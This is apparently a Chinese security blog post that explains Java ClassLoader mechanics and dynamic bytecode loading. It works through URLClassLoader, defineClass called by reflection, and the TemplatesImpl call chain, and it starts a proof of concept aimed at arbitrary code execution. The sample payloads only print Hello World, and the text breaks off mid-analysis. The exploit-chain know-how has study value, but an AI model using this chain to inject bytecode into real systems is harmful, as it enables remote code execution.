<p>但是系统程序在启动时，不会一次性加载所有的程序要使用的Class文件到内存中，而是根据程序的需要，通过类加载机制动态将程序要使用的Class文件加载到内存中。只有当class文件杯加载到内存中，才能够被调用。这个机制其实就是类加载机制，也就是classloader（classloader在这里既指类加载器也指类加载机制）。</p>
<p>classloader类的核心方法：</p>
<ol>
<li><code>loadClass</code>（加载指定的Java类）</li>
<li><code>findClass</code>（查找指定的Java类）</li>
<li><code>findLoadedClass</code>（查找JVM已经加载过的类）</li>
<li><code>defineClass</code>（定义一个Java类）</li>
<li><code>resolveClass</code>（链接指定的Java类）</li>
</ol>
<h2 id="classLoader的分类"><a href="#classLoader的分类" class="headerlink" title="classLoader的分类"></a>classLoader的分类</h2><p>在java中，类加载器根据加载类的方式和范围，可以分为以下几种类型：</p>
<p><strong>1、引导类加载器（Bootstrap ClassLoade）</strong>： 它是 JVM 的一部分，是最顶层的类加载器，负责加载 Java 核心类库，如 <code>java.lang.*</code> 等。引导类加载器是用本地代码实现的，无法在 Java 程序中直接获取它的引用。由于它是 JVM 内置的，无需实现，其加载路径为 JVM 的系统类路径（JRE&#x2F;lib&#x2F;*）。</p>
<p><strong>2、扩展类加载器（Extension ClassLoader）</strong>：它是 <code>sun.misc.Launcher$ExtClassLoader</code>，负责加载 Java 扩展目录（jre&#x2F;lib&#x2F;ext）下的类库。Java 扩展目录是 JVM 预定义的，用于存放供 JVM 扩展使用的类库。扩展类加载器的父类加载器是引导类加载器。</p>
<p><strong>3、应用程序类加载器（Application ClassLoader）</strong>： 它是 <code>sun.misc.Launcher$AppClassLoader</code>，也称为系统类加载器。应用程序类加载器负责加载应用程序类路径（CLASSPATH）上指定的类库，包括用户自定义的类和第三方库。应用程序类加载器的父类加载器是扩展类加载器。</p>
<p><strong>4、自定义加载器（Custom ClassLoader）</strong>：开发人员可以通过继承 <code>ClassLoader</code> 类，自定义自己的类加载器。自定义类加载器允许实现特定的类加载需求，例如从网络、数据库或其他来源动态加载类。自定义类加载器需要重写 <code>findClass</code> 方法来定制类的加载逻辑，并通常还会重写 <code>loadClass</code> 方法来实现自定义加载策略。其实也就是用户自定义。</p>
<h2 id="双亲委派机制"><a href="#双亲委派机制" class="headerlink" title="双亲委派机制"></a>双亲委派机制</h2><p>上面我们介绍了clasloader的加载器分类：</p>
<p>然后我们这里了解一下类加载的双亲委派</p>
<p>下面我们通过一张图来介绍双亲委派模型：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230731160759360.png"
                      alt="image-20230731160759360"
                ></p>
<p><strong>双亲委派机制</strong></p>
<p>分为委托阶段和派发阶段：</p>
<p>委托阶段：</p>
<p>当一个类被加载的时候首先会先判断自己是否已经加载，如果加载了之间返回相应的对象，如果没有被加载，则委托给父类加载器。父类加载器同样也是判断是否加载，同样未加载的话，委托给其父类加载器，直至到达顶层的类加载器引导类加载器（Bootstrap ClassLoade），相应的加载了就返回相应对象，如果直到引导层加载器都未加载成功，说明类未加载，这时就会进入派发阶段，查找并加载类。</p>
<p>派发阶段:</p>
<p>当到达引导类加载器，bootstrapClassLoader 会去对应的目录下（<code>%JAVA_HOME%jre/lib/</code>）搜索该类，找到了就加载类，未能找到就派发给子类加载器进行加载，子类执行的也是执行同样的操作，搜索这个类，有的话加载类，没有继续派发给子类加载器。</p>
<p>根据这个模型我们可以看到最终会到达自定义加载器，如果自定义加载器也未能加载成功就会抛出<code>ClassNotFoundException</code> 异常并退出。</p>
<p>综合来说就是，当我们加载一个类的时候会先判断自己是否加载，加载的话就直接返回，没加载就调用父类加载器，直到引导类加载器都没有加载成功，在调用子类加载器进行加载,直到调用到自定义加载器。</p>
<p>我们这里结合loaderclass代码进行具体分析一下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">protected Class&lt;?&gt; loadClass(String name, boolean resolve)</span><br><span class="line">       throws ClassNotFoundException</span><br><span class="line">   &#123;</span><br><span class="line">       synchronized (getClassLoadingLock(name)) &#123;</span><br><span class="line">           // First, check if the class has already been loaded</span><br><span class="line">           Class&lt;?&gt; c = findLoadedClass(name);</span><br><span class="line">           if (c == null) &#123;                                                //双亲委派</span><br><span class="line">               long t0 = System.nanoTime();</span><br><span class="line">               try &#123;</span><br><span class="line">                   if (parent != null) &#123;</span><br><span class="line">                       c = parent.loadClass(name, false);</span><br><span class="line">                   &#125; else &#123;</span><br><span class="line">                       c = findBootstrapClassOrNull(name);</span><br><span class="line">                   &#125;</span><br><span class="line">               &#125; catch (ClassNotFoundException e) &#123;</span><br><span class="line">                   // ClassNotFoundException thrown if class not found</span><br><span class="line">                   // from the non-null parent class loader</span><br><span class="line">               &#125;</span><br><span class="line"></span><br><span class="line">               if (c == null) &#123;</span><br><span class="line">                   // If still not found, then invoke findClass in order</span><br><span class="line">                   // to find the class.</span><br><span class="line">                   long t1 = System.nanoTime();</span><br><span class="line">                   c = findClass(name);</span><br><span class="line"></span><br><span class="line">                   // this is the defining class loader; record the stats</span><br><span class="line">                   sun.misc.PerfCounter.getParentDelegationTime().addTime(t1 - t0);</span><br><span class="line">                   sun.misc.PerfCounter.getFindClassTime().addElapsedTimeFrom(t1);</span><br><span class="line">                   sun.misc.PerfCounter.getFindClasses().increment();</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">           if (resolve) &#123;</span><br><span class="line">               resolveClass(c);</span><br><span class="line">           &#125;</span><br><span class="line">           return c;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></div>

<p>首先通过findLoadedClass(name）方法检查类是否已经加载了，如果加载了就直接返回，不会重复加载，没有加载就做加载处理，</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (c == null) &#123;</span><br><span class="line">     long t0 = System.nanoTime();</span><br><span class="line">     try &#123;</span><br><span class="line">         if (parent != null) &#123;</span><br><span class="line">             c = parent.loadClass(name, false);</span><br><span class="line">         &#125; else &#123;</span><br><span class="line">             c = findBootstrapClassOrNull(name);</span><br><span class="line">         &#125;</span><br><span class="line">     &#125; catch (ClassNotFoundException e) &#123;</span><br><span class="line">         // ClassNotFoundException thrown if class not found</span><br><span class="line">         // from the non-null parent class loader</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure></div>

<p>如果类未被加载，首先优先尝试使用父类加载器即调用 <code>parent.loadClass(name, false)（这里其实也就是双亲委派加载机制）;</code>方法parent是当前加载的父类加载器。同样父类加载器在加载类时也会按同样的方法进行。</p>
<p>如果父类加载器加载成功，返回相应的class对象 c。</p>
<p>如果未加载成功，继续调用父类的父类加载器直到尝试调用引导类加载器，这里即调用<code>findBootstrapClassOrNull(name)</code>，这里关于引导类加载器我们上面有介绍。同样的加载成功返回对象c，如果引导类加载器也未能加载成功，说明类既不在父类加载器中，也不在引导类加载器中，表面类还未加载。</p>
<p>则会调用<code>findClass(name)</code> 方法</p>
<p>我们这里跟进到findclass方法：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230731154334733.png"
                      alt="image-20230731154334733"
                ></p>
<p>我们可以看到findClass方法里面是空的，也就是未定义，其实这里就是要用户自己去定义实现的，也就是我们上面说的用户自定义加载器。如果Classloader中并没有重写findClass方法则会抛出异常。如果重写了findClass方法，则会根据重写的逻辑查找类名，并加载字节码，返回对象的class对象.</p>
<p>优点：避免重复加载某些类，当父加载器已经加载了某个类后，子加载器不会重复加载。<br>            双亲委派模型可以提供类加载的安全性。由于类加载是从上到下依次委派的，子类加载器只有在父类加载器无法加载指定类时才会尝试加载。这样可以避免恶意代码替换系统类，防止不信任的类替代核心类库，提高了系统的安全性。 </p>
<p>下面我们了解一下类加载的具体过程:</p>
<h2 id="类加载的方式"><a href="#类加载的方式" class="headerlink" title="类加载的方式"></a>类加载的方式</h2><p>java虚拟机启动时加载java类文件的两种方式：</p>
<p><strong>1、隐式加载：</strong>隐式加载是指 JVM 在启动时自动加载需要的类到内存中。这些类通常包括 Java 核心类库（如 <code>java.lang.*</code> 等）和一些基础类，它们在 JVM 启动过程中会被预先加载，以确保 JVM 的正常运行。这些类由引导类加载器（Bootstrap ClassLoader）负责加载，它是 JVM 的一部分，是最顶层的类加载器，使用本地代码实现，无法在 Java 程序中直接获取其引用。</p>
<p><strong>2、显式加载：</strong>显式加载是指在 Java 程序运行时通过代码显式地加载类。Java 程序可以使用类加载器（ClassLoader）来加载额外的类，比如用户自定义的类或第三方库。应用程序类加载器（Application ClassLoader）是负责加载应用程序类路径（CLASSPATH）上指定的类库，包括用户自定义的类和第三方库。开发人员也可以通过继承 <code>ClassLoader</code> 类来实现自定义的类加载器，以实现特定的类加载需求。</p>
<p>通过上面的概念我们可以理解为动态加载，即通过反射，或CLassloader动态加载class文件，而隐式加载new类实列，java.lang.Object，基础数据类型的包装类、基于异常数据的包装类等等这些。</p>
<h2 id="类加载的过程"><a href="#类加载的过程" class="headerlink" title="类加载的过程"></a>类加载的过程</h2><p>上面我们了解了类加载的两种方式，下面我们具体分析一下类加载的过程：</p>
<ol>
<li><strong>加载（Loading）：</strong> 加载是类加载的第一个阶段，它是将类的字节码文件（通常是以 <code>.class</code> 后缀的文件）从磁盘或网络加载到内存中的过程。加载过程由类加载器（ClassLoader）来完成。类加载器根据类的全限定名（包括包名和类名）查找类的字节码文件，然后读取字节码文件，并创建对应的 <code>Class</code> 对象。</li>
<li><strong>连接（Linking）：</strong> 连接是类加载的第二个阶段，它包括三个子阶段：验证、准备和解析。<ul>
<li><strong>验证（Verification）：</strong> 在验证阶段，JVM 将对加载的字节码进行验证，以确保字节码是合法、符合规范的。验证阶段主要包括类型检查、字节码验证、符号引用验证等，用于确保字节码的正确性和安全性。</li>
<li><strong>准备（Preparation）：</strong> 在准备阶段，JVM 为类的静态变量（类变量）分配内存，并设置默认初始值。这些静态变量会在类加载完成后被初始化为指定的初始值。注意，实例变量在这个阶段并不会被赋予初值，它们会在对象实例化时进行初始化。</li>
<li><strong>解析（Resolution）：</strong> 在解析阶段，JVM 将符号引用替换为直接引用。符号引用是一种在字节码中使用的符号来表示目标类或方法的引用，而直接引用是指向目标的真实指针或句柄。解析过程将符号引用转换为直接引用，以便在后续的执行中能够直接定位目标类或方法。</li>
</ul>
</li>
<li><strong>初始化（Initialization）：</strong> 初始化是类加载的最后一个阶段，在这个阶段，JVM 执行类的初始化代码，为静态变量赋予正确的初始值，并执行类中定义的静态初始化块。类的初始化是在类加载的最后阶段进行的，只有在真正使用类时才会触发初始化，例如创建类的实例、调用类的静态方法、访问类的静态变量等。初始化阶段可以包括复杂的逻辑和代码，这取决于类的定义和开发人员编写的初始化代码。</li>
</ol>
<h1 id="四、动态加载字节码"><a href="#四、动态加载字节码" class="headerlink" title="四、动态加载字节码"></a>四、动态加载字节码</h1><p>上面我们对classloader进行了学习，然后这里我们正式开始学习java如何动态加载字节码</p>
<h2 id="URLClassLoader加载远程class文件"><a href="#URLClassLoader加载远程class文件" class="headerlink" title="URLClassLoader加载远程class文件"></a>URLClassLoader加载远程class文件</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230731165428773.png"
                      alt="image-20230731165428773"
                ></p>
<p>可以看到URLclassloader是继承 SecureClassLoader类的</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230731165439886.png"
                      alt="image-20230731165439886"
                ></p>
<p>而这里的 SecureClassLoader是继承了CLassloader类的，而且这个URLclassloader是我们上面介绍的应用程序加载器(appclassloader)的父类</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230731165933112.png"
                      alt="image-20230731165933112"
                ></p>
<p>我们在上面双亲委派机制中说过，会先父类查询父类是否加载，直到引导下型加载器都未加载，开始从引导型加载器开始搜索类进行加载，引导型没有找到，子类进行查找加载，直到自定义加载器。</p>
<p>但是这个搜索是怎么搜索的呢?</p>
<p><strong>以下内容引自P神java安全漫谈</strong></p>
<p>正常情况下，Java会根据配置项 <code>sun.boot.class.path</code> 和 <code>java.class.path</code> 中列举到的基础路径（这<br>些路径是经过处理后的 <code>java.net.URL</code> 类）来寻找<code>.class</code>文件来加载，而这个基础路径有分为三种情况：</p>
<ul>
<li>URL未以斜杠 <code>/</code>结尾，则认为是一个JAR文件，使用 JarLoader 来寻找类，即为在Jar包中寻找.class文件</li>
<li>URL以斜杠 <code>/</code> 结尾，且协议名是 file ，则使用 FileLoader 来寻找类，即为在本地文件系统中寻找.class文件</li>
<li>URL以斜杠 <code>/</code>结尾，且协议名不是 file ，则使用最基础的 Loader 来寻找类</li>
</ul>
<p>我们这里通过http协议进行测试：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import java.net.URL;</span><br><span class="line">import java.net.URLClassLoader;</span><br><span class="line">public class HelloClassLoader &#123;</span><br><span class="line">    public static void main( String[] args ) throws Exception</span><br><span class="line">    &#123;</span><br><span class="line">        URL[] urls = &#123;new URL(&quot;http://localhost:8000/&quot;)&#125;;</span><br><span class="line">        URLClassLoader loader = URLClassLoader.newInstance(urls);</span><br><span class="line">        Class c = loader.loadClass(&quot;Hello&quot;);</span><br><span class="line">        c.newInstance();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>编译一个class文件放在服务器所在目录</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class Hello &#123;</span><br><span class="line">    static&#123;</span><br><span class="line">        System.out.println(&quot;Hello,world&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>我这里之间在class文件所在开一个服务</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230731171312206.png"
                      alt="image-20230731171312206"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230731171405819.png"
                      alt="image-20230731171405819"
                ></p>
<p>可以看到成功加载到远程服务器上面的class文件，并执行了字节码输出了我们定义的helloworld</p>
<h2 id="ClassLoader-defineClass-加载字节码"><a href="#ClassLoader-defineClass-加载字节码" class="headerlink" title="ClassLoader#defineClass() 加载字节码"></a>ClassLoader#defineClass() 加载字节码</h2><p>我们这里在回顾一下双亲委派的实现代码</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Class&lt;?&gt; c = findLoadedClass(name);</span><br><span class="line">         if (c == null) &#123;                                                //双亲委派</span><br><span class="line">             long t0 = System.nanoTime();</span><br><span class="line">             try &#123;</span><br><span class="line">                 if (parent != null) &#123;</span><br><span class="line">                     c = parent.loadClass(name, false);</span><br><span class="line">                 &#125; else &#123;</span><br><span class="line">                     c = findBootstrapClassOrNull(name);</span><br><span class="line">                 &#125;</span><br><span class="line">             &#125; catch (ClassNotFoundException e) &#123;</span><br><span class="line">                 // ClassNotFoundException thrown if class not found</span><br><span class="line">                 // from the non-null parent class loader</span><br><span class="line">             &#125;</span><br><span class="line"></span><br><span class="line">             if (c == null) &#123;</span><br><span class="line">                 // If still not found, then invoke findClass in order</span><br><span class="line">                 // to find the class.</span><br><span class="line">                 long t1 = System.nanoTime();</span><br><span class="line">                 c = findClass(name);</span><br><span class="line"></span><br><span class="line">                 // this is the defining class loader; record the stats</span><br><span class="line">                 sun.misc.PerfCounter.getParentDelegationTime().addTime(t1 - t0);</span><br><span class="line">                 sun.misc.PerfCounter.getFindClassTime().addElapsedTimeFrom(t1);</span><br><span class="line">                 sun.misc.PerfCounter.getFindClasses().increment();</span><br><span class="line">             &#125;</span><br></pre></td></tr></table></figure></div>

<p>我们在双亲委派中学习了，在加载一个类时首先会先调用<code>findLoadedClass(name)</code>方法检查是否已经加载了对应名称的类，如果未加载会调用父类加载器通过loadclass来加载类</p>
<p>直到顶层加载器都不能加载成功，子类加载器会开始搜索类进行加载，这里使用的就是findclass(name)方法来查找加载类（类似我们上面的URLClassLoader），如果子类也不能加载继续调用子类加载器，直到调用到自定义加载器。当加载到类后会调用defineclass方法，并将字节码的字节数组、类名等信息传递给该方法。<code>defineClass</code> 方法会在 JVM 中将这些字节码转换为一个 Java 类的 <code>Class</code> 类，并将其加入到类加载器的类命名空间中。</p>
<p>其实前面两个loadclass和findclass都是在查找加载类，而defineclass才是真正的核心。</p>
<p>也就是说define将加载的字节码转换为一个java类。</p>
<p>那么根据上面的分析，不论是加载什么class文件都会经历这三个方法的调用：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">CLassloader#CLassloader#loadclass======&gt; CLassloader#CLassloader#findclass(name)========&gt;CLassloader#dCLassloader#efineclass</span><br></pre></td></tr></table></figure></div>

<p>我们这里看一下clasLoader类中的defineclass方法：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">protected final Class&lt;?&gt; defineClass(String name, byte[] b, int off, int len)</span><br><span class="line">      throws ClassFormatError</span><br><span class="line">  &#123;</span><br><span class="line">      return defineClass(name, b, off, len, null);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></div>

<p>可以看到defineclass是一个受保护的方法，我们不能够直接调用，所以我们如果要外部调用的话，这里要通过反射来获取这个defineclass方法。</p>
<p>接收三个参数，一个字符方法名，一个字节数组，一个偏移量一个长度</p>
<p>示例代码：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import java.lang.reflect.Method;</span><br><span class="line">import java.util.Base64;</span><br><span class="line"></span><br><span class="line">public class HelloDefineClass &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        Method defineClass = ClassLoader.class.getDeclaredMethod(&quot;defineClass&quot;, String.class, byte[].class, int.class, int.class);</span><br><span class="line">        defineClass.setAccessible(true);</span><br><span class="line">        byte[] code = Base64.getDecoder().decode(&quot;yv66vgAAADQAGwoABgANCQAOAA8IABAKABEAEgcAEwcAFAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApTb3VyY2VGaWxlAQAKSGVsbG8uamF2YQwABwAIBwAVDAAWABcBAAtIZWxsbyBXb3JsZAcAGAwAGQAaAQAFSGVsbG8BABBqYXZhL2xhbmcvT2JqZWN0AQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABQAGAAAAAAABAAEABwAIAAEACQAAAC0AAgABAAAADSq3AAGyAAISA7YABLEAAAABAAoAAAAOAAMAAAACAAQABAAMAAUAAQALAAAAAgAM&quot;);</span><br><span class="line">                        Class hello = (Class)defineClass.invoke(ClassLoader.getSystemClassLoader(), &quot;Hello&quot;, code, 0, code.length);</span><br><span class="line">                        hello.newInstance();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这里的code就是字节码</p>
<p>ClassLoader.getSystemClassLoader()获取系统类加载器实例，返回一个classloader对象</p>
<p>然后调用sefineclass方法对字节码进行处理转换为java类</p>
<p>运行结果：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230731180256672.png"
                      alt="image-20230731180256672"
                ></p>
<p>这里要注意的是defineclass被调用的时候，类对象不会被初始化，只有显式调用构造函数，初始化代码才会被执行，而且即使我们的代码放到类的静态代码块中也无法直接被调用到，如果我们要使用 defineClass 在目标机器上执行任意代码，需要想办法调用构造函数。</p>
<h2 id="利用TemplatesImpl加载字节码"><a href="#利用TemplatesImpl加载字节码" class="headerlink" title="利用TemplatesImpl加载字节码"></a>利用TemplatesImpl加载字节码</h2><p>上面我们分析了defindclass加载字节码，但是我们defineclass这个方法是受保护的方法，不能够直接被调用，所以这里我们不能够直接调用。</p>
<p>那么我们要想使用这个方法执行任意代码就要向上找调用：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230731181531200.png"
                      alt="image-20230731181531200"
                ></p>
<p>虽然大多数开发者不会直接使用defineclass方法，但是在java的一些底层方法中还是有调用了defineclass的</p>
<p>我们这里利用的是<code>TemplatesImp</code>l</p>
<p>在<code>TemplatesImp</code>l的TransletClassLoader类中重写了defineclass方法</p>
<p>跟进到</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">static final class TransletClassLoader extends ClassLoader &#123;</span><br><span class="line">    private final Map&lt;String,Class&gt; _loadedExternalExtensionFunctions;</span><br><span class="line"></span><br><span class="line">     TransletClassLoader(ClassLoader parent) &#123;</span><br><span class="line">         super(parent);</span><br><span class="line">        _loadedExternalExtensionFunctions = null;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    TransletClassLoader(ClassLoader parent,Map&lt;String, Class&gt; mapEF) &#123;</span><br><span class="line">        super(parent);</span><br><span class="line">        _loadedExternalExtensionFunctions = mapEF;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public Class&lt;?&gt; loadClass(String name) throws ClassNotFoundException &#123;</span><br><span class="line">        Class&lt;?&gt; ret = null;</span><br><span class="line">        // The _loadedExternalExtensionFunctions will be empty when the</span><br><span class="line">        // SecurityManager is not set and the FSP is turned off</span><br><span class="line">        if (_loadedExternalExtensionFunctions != null) &#123;</span><br><span class="line">            ret = _loadedExternalExtensionFunctions.get(name);</span><br><span class="line">        &#125;</span><br><span class="line">        if (ret == null) &#123;</span><br><span class="line">            ret = super.loadClass(name);</span><br><span class="line">        &#125;</span><br><span class="line">        return ret;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * Access to final protected superclass member from outer class.</span><br><span class="line">     */</span><br><span class="line">    Class defineClass(final byte[] b) &#123;</span><br><span class="line">        return defineClass(null, b, 0, b.length);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>而且这里并没有显式的声明其定义域。在java中如果一个方法没有显式的声明作用域，那么其作用域为default。那么这里的defineclass方法就由父类的protected变成了一个default类型的方法。</p>
<p>那么我们就要在<code>TemplatesImp</code>l中看一下哪里调用了defineclass</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230731183014046.png"
                      alt="image-20230731183014046"
                ></p>
<p>根据查找用法我们可以在defineTransletClasses()中找到调用</p>
<p>但是这个是一个私有方法，不能直接调用，继续向上找调用：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230731183214197.png"
                      alt="image-20230731183214197"
                ></p>
<p>getTransletInstance()同样是一个私有方法，继续向上找调用：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230731183356861.png"
                      alt="image-20230731183356861"
                ></p>
<p>在newTransformer中可以找到对getTransletInstance()的调用，而且newTransformer是一个公有方法，那么我们这里外部可以直接调用，那么利用链就到这里结束了。</p>
<p>这里给出利用链：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">TemplatesImpl#newTransformer() -&gt;</span><br><span class="line">TemplatesImpl#getTransletInstance() -&gt; </span><br><span class="line">TemplatesImpl#defineTransletClasses()-&gt; </span><br><span class="line">TransletClassLoader#defineClass()</span><br></pre></td></tr></table></figure></div>

<p>但是这只是利用链，我们要想要利用这条链，就要解决细节部分，写出POC实现利用：<br>我们继续回到newTransformer()的getTransletInstance()</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">transformer = new TransformerImpl(getTransletInstance(), _outputProperties,</span><br><span class="line">          _indentNumber, _tfactory);</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230731184214068.png"
                      alt="image-20230731184214068"
                ></p>
<p>根据代码我们可以看到当<code>_name</code>不为空，<code>_class</code>为空时才能够调用defineTransletClasses()方法</p>
<p>但是默认情况下这两个参数都为空</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230731184353198.png"
                      alt="image-20230731184353198"
                ></p>
<p>所以我们这里想要调用defineTransletClasses()方法就要修改_name不为空</p>
<p>然后我们在类中可以找到它的构造器:</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">public TemplatesImpl() &#123; &#125;</span><br></pre></td></tr></table></figure></div>

<p>那么我们这里就可以通过反射去修改属性值：</p>
<p>即：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">        Field field = obj.getClass().getDeclaredField(fieldName);//获取class对象后获取定名称 fieldName 的属性的 Field 对象</span><br><span class="line">        field.setAccessible(true);//设置 Field 对象的 accessible 属性为 true使我们可以修改属性值</span><br><span class="line">        field.set(obj,value);//修改值</span><br></pre></td></tr></table></figure></div>

<p>这里由于要修改的很多，所以我们这里直接定义一个方法来简化我们的代码：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception&#123;</span><br><span class="line">        Field field = obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(true);</span><br><span class="line">        field.set(obj,value);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>

<p>那么我们的POC为：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"></span><br><span class="line">import javax.xml.transform.Templates;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line">public class ces &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        Templates templates=new TemplatesImpl();</span><br><span class="line">        setFieldValue(templates,&quot;_name&quot;,&quot;111&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception&#123;</span><br><span class="line">        Field filed = obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        filed.setAccessible(true);</span><br><span class="line">        filed.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>继续跟进到defineTransletClasses()：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230731190017497.png"
                      alt="image-20230731190017497"
                ></p>
<p>我们这里先看一下我们要调用的defineClass()方法：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">try &#123;</span><br><span class="line">            final int classCount = _bytecodes.length;</span><br><span class="line">            _class = new Class[classCount];</span><br><span class="line"></span><br><span class="line">            if (classCount &gt; 1) &#123;</span><br><span class="line">                _auxClasses = new HashMap&lt;&gt;();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            for (int i = 0; i &lt; classCount; i++) &#123;</span><br><span class="line">                _class[i] = loader.defineClass(_bytecodes[i]);</span><br><span class="line">                final Class superClass = _class[i].getSuperclass();</span><br><span class="line"></span><br><span class="line">                // Check if this is the main class</span><br><span class="line">                if (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123;</span><br><span class="line">                    _transletIndex = i;</span><br><span class="line">                &#125;</span><br><span class="line">                else &#123;</span><br><span class="line">                    _auxClasses.put(_class[i].getName(), _class[i]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure></div>

<p>我们在调用<code>defineclass</code>方法时还传入了一个字节数组<code>_bytecodes[i]</code></p>
<p>那么结合前面这里这个字节数组就是我们要传入的字节码</p>
<p>那么其实这个就是实现了遍历字节数组取出当中的字节码，然后传入defineclass进行处理</p>
<p>但是我们不可能调用<code>defineTransletClasses()</code>就能够直接调用到<code>defineClass</code></p>
<p>我们这里分析一下上面的代码逻辑：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (_bytecodes == null) &#123;</span><br><span class="line">    ErrorMsg err = new ErrorMsg(ErrorMsg.NO_TRANSLET_CLASS_ERR);</span><br><span class="line">    throw new TransformerConfigurationException(err.toString());</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

